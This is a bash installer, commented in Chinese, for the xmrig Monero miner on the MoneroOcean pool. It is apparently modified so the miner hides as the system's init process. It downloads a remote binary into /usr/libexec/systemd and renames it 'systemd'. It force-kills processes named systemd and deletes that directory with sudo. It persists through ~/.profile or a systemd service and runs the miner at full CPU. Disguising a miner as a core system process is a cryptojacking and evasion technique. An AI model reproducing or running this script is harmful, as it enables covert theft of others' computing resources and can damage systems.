#!/bin/bash

VERSION=2.11

# 打印欢迎信息
echo "MoneroOcean 挖矿设置脚本 v$VERSION。"
echo "(如有问题请将本脚本的完整输出发送至 support@moneroocean.stream 邮箱)"
echo

if [ "$(id -u)" == "0" ]; then
  echo "警告：通常不建议以 root 用户身份运行此脚本"
fi

# 命令行参数
WALLET=$1
EMAIL=$2 # 可选参数

# 检查前置条件

if [ -z $WALLET ]; then
  echo "脚本用法:"
  echo "> setup_moneroocean_miner.sh <钱包地址> [<您的邮箱地址>]"
  echo "错误：请指定您的钱包地址"
  exit 1
fi

WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
  echo "错误：钱包地址长度不正确 (应为106或95): ${#WALLET_BASE}"
  exit 1
fi

if [ -z $HOME ]; then
  echo "错误：请定义 HOME 环境变量到您的家目录"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "错误：请确保 HOME 目录 $HOME 存在或使用以下命令自行设置:"
  echo '  export HOME=<目录>'
  exit 1
fi

if ! type curl >/dev/null; then
  echo "错误：本脚本需要 \"curl\" 工具才能正常工作"
  exit 1
fi

if ! type lscpu >/dev/null; then
  echo "警告：本脚本需要 \"lscpu\" 工具才能准确工作"
fi

# 计算端口

CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "错误：无法计算预计的 Monero CN 算力"
  exit 1
fi

power2() {
  if ! type bc >/dev/null; then
    if   [ "$1" -gt "8192" ]; then
      echo "8192"
    elif [ "$1" -gt "4096" ]; then
      echo "4096"
    elif [ "$1" -gt "2048" ]; then
      echo "2048"
    elif [ "$1" -gt "1024" ]; then
      echo "1024"
    elif [ "$1" -gt "512" ]; then
      echo "512"
    elif [ "$1" -gt "256" ]; then
      echo "256"
    elif [ "$1" -gt "128" ]; then
      echo "128"
    elif [ "$1" -gt "64" ]; then
      echo "64"
    elif [ "$1" -gt "32" ]; then
      echo "32"
    elif [ "$1" -gt "16" ]; then
      echo "16"
    elif [ "$1" -gt "8" ]; then
      echo "8"
    elif [ "$1" -gt "4" ]; then
      echo "4"
    elif [ "$1" -gt "2" ]; then
      echo "2"
    else
      echo "1"
    fi
  else 
    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
  fi
}

PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
PORT=$(( $PORT == 0 ? 1 : $PORT ))
PORT=`power2 $PORT`
PORT=$(( 10000 + $PORT ))
if [ -z $PORT ]; then
  echo "错误：无法计算端口"
  exit 1
fi

if [ "$PORT" -lt "10001" -o "$PORT" -gt "18212" ]; then
  echo "错误：计算出的端口值不正确: $PORT"
  exit 1
fi

# 打印意图

echo "我将下载、设置并运行 Monero CPU 挖矿程序。"
echo "如果需要，可以通过 /usr/libexec/systemd/miner.sh 脚本在前台启动矿工。"
echo "挖矿将使用钱包地址 $WALLET。"
if [ ! -z $EMAIL ]; then
  echo "(并使用 $EMAIL 邮箱作为密码，稍后可在 https://moneroocean.stream 网站修改钱包选项)"
fi
echo

if ! sudo -n true 2>/dev/null; then
  echo "由于无法无密码使用 sudo，后台挖矿将在您重启后首次登录时从 $HOME/.profile 文件启动。"
else
  echo "后台挖矿将使用 moneroocean_miner systemd 服务执行。"
fi

echo
echo "仅供参考：本主机有 $CPU_THREADS 个 CPU 线程，预计 Monero 算力约为 $EXP_MONERO_HASHRATE KH/s。"
echo

echo "继续前将等待15秒 (按 Ctrl+C 取消)"
sleep 15
echo
echo

# 开始准备工作

echo "[*] 移除之前的 moneroocean 矿工 (如果有)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop moneroocean_miner.service
fi
killall -9 systemd

echo "[*] 移除 /usr/libexec/systemd 目录"
sudo rm -rf /usr/libexec/systemd

echo "[*] 下载 MoneroOcean 高级版的 xmrig 到 /tmp/xmrig.tar.gz"
if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "错误：无法下载 https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz 文件到 /tmp/xmrig.tar.gz"
  exit 1
fi

echo "[*] 解压 /tmp/xmrig.tar.gz 到 /usr/libexec/systemd"
sudo mkdir -p /usr/libexec/systemd
if ! sudo tar xf /tmp/xmrig.tar.gz -C /usr/libexec/systemd; then
  echo "错误：无法解压 /tmp/xmrig.tar.gz 到 /usr/libexec/systemd 目录"
  exit 1
fi
rm /tmp/xmrig.tar.gz

echo "[*] 检查 /usr/libexec/systemd/systemd 是否正常工作 (未被杀毒软件删除)"
sudo mv /usr/libexec/systemd/xmrig /usr/libexec/systemd/systemd
sudo sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' /usr/libexec/systemd/config.json
sudo /usr/libexec/systemd/systemd --help >/dev/null
if (test $? -ne 0); then
  if [ -f /usr/libexec/systemd/systemd ]; then
    echo "警告：高级版的 /usr/libexec/systemd/systemd 无法正常工作"
  else 
    echo "警告：高级版的 /usr/libexec/systemd/systemd 已被杀毒软件删除 (或其他问题)"
  fi

  echo "[*] 寻找最新版的 Monero 矿工"
  LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
  LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`

  echo "[*] 下载 $LATEST_XMRIG_LINUX_RELEASE 到 /tmp/xmrig.tar.gz"
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
    echo "错误：无法下载 $LATEST_XMRIG_LINUX_RELEASE 文件到 /tmp/xmrig.tar.gz"
    exit 1
  fi

  echo "[*] 解压 /tmp/xmrig.tar.gz 到 /usr/libexec/systemd"
  if ! sudo tar xf /tmp/xmrig.tar.gz -C /usr/libexec/systemd --strip=1; then
    echo "警告：无法解压 /tmp/xmrig.tar.gz 到 /usr/libexec/systemd 目录"
  fi
  rm /tmp/xmrig.tar.gz
  sudo mv /usr/libexec/systemd/xmrig /usr/libexec/systemd/systemd

  echo "[*] 检查标准版的 /usr/libexec/systemd/systemd 是否正常工作 (未被杀毒软件删除)"
  sudo sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' /usr/libexec/systemd/config.json
  sudo /usr/libexec/systemd/systemd --help >/dev/null
  if (test $? -ne 0); then 
    if [ -f /usr/libexec/systemd/systemd ]; then
      echo "错误：标准版的 /usr/libexec/systemd/systemd 也无法正常工作"
    else 
      echo "错误：标准版的 /usr/libexec/systemd/systemd 也被杀毒软件删除了"
    fi
    exit 1
  fi
fi

echo "[*] 矿工 /usr/libexec/systemd/systemd 工作正常"

PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS:$EMAIL"
fi

PORT=11024
sudo sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' /usr/libexec/systemd/config.json
sudo sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' /usr/libexec/systemd/config.json
sudo sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' /usr/libexec/systemd/config.json
sudo sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' /usr/libexec/systemd/config.json
sudo sed -i 's#"log-file": *null,#"log-file": "/usr/libexec/systemd/systemd.log",#' /usr/libexec/systemd/config.json
sudo sed -i 's/"syslog": *[^,]*,/"syslog": true,/' /usr/libexec/systemd/config.json

sudo cp /usr/libexec/systemd/config.json /usr/libexec/systemd/config_background.json
sudo sed -i 's/"background": *false,/"background": true,/' /usr/libexec/systemd/config_background.json

# 准备脚本

echo "[*] 创建 /usr/libexec/systemd/miner.sh 脚本"
sudo cat >/usr/libexec/systemd/miner.sh <<EOL
#!/bin/bash
if ! pidof systemd >/dev/null; then
  nice /usr/libexec/systemd/systemd \$*
else
  echo "Monero 矿工已在后台运行。拒绝启动另一个。"
  echo "如果您想先移除后台矿工，请运行 \"killall systemd\" 或 \"sudo killall systemd\"。"
fi
EOL

sudo chmod +x /usr/libexec/systemd/miner.sh

# 准备后台工作和重启后工作

if ! sudo -n true 2>/dev/null; then
  if ! grep /usr/libexec/systemd/miner.sh $HOME/.profile >/dev/null; then
    echo "[*] 添加 /usr/libexec/systemd/miner.sh 脚本到 $HOME/.profile"
    echo "/usr/libexec/systemd/miner.sh --config=/usr/libexec/systemd/config_background.json >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "/usr/libexec/systemd/miner.sh 脚本已存在于 $HOME/.profile 中"
  fi
  echo "[*] 在后台运行矿工 (日志见 /usr/libexec/systemd/systemd.log 文件)"
  /bin/bash /usr/libexec/systemd/miner.sh --config=/usr/libexec/systemd/config_background.json >/dev/null 2>&1
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
    echo "[*] 启用大页支持"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    echo "[*] 在后台运行矿工 (日志见 /usr/libexec/systemd/systemd.log 文件)"
    /bin/bash /usr/libexec/systemd/miner.sh --config=/usr/libexec/systemd/config_background.json >/dev/null 2>&1
    echo "错误：本脚本需要 \"systemctl\" systemd 工具才能正常工作。"
    echo "请迁移到更现代的 Linux 发行版或自行设置重启后的矿工激活。"

  else

    echo "[*] 创建 moneroocean_miner systemd 服务"
    cat >/tmp/moneroocean_miner.service <<EOL
[Unit]
Description=Monero 挖矿服务

[Service]
ExecStart=/usr/libexec/systemd/systemd --config=/usr/libexec/systemd/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/moneroocean_miner.service /etc/systemd/system/moneroocean_miner.service
    echo "[*] 启动 moneroocean_miner systemd 服务"
    sudo killall systemd 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable moneroocean_miner.service
    sudo systemctl start moneroocean_miner.service
    echo "查看矿工服务日志请运行 \"sudo journalctl -u moneroocean_miner -f\" 命令"
  fi
fi

echo ""
echo "注意：如果您使用的是共享VPS，建议避免矿工产生100% CPU使用率，否则可能会被禁止"
if [ "$CPU_THREADS" -lt "4" ]; then
  echo "提示：请在root下执行以下或类似命令来限制矿工使用75%的CPU:"
  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
  echo "sudo cpulimit -e systemd -l $((75*$CPU_THREADS)) -b"
  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
    echo "sudo sed -i -e '\$acpulimit -e systemd -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  else
    echo "sudo sed -i -e '\$i \\cpulimit -e systemd -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  fi
else
  echo "提示：请执行以下命令并重启VPS以限制矿工使用75%的CPU:"
  echo "sudo sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' /usr/libexec/systemd/config.json"
  echo "sudo sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' /usr/libexec/systemd/config_background.json"
fi
echo ""

echo "[*] 设置完成"
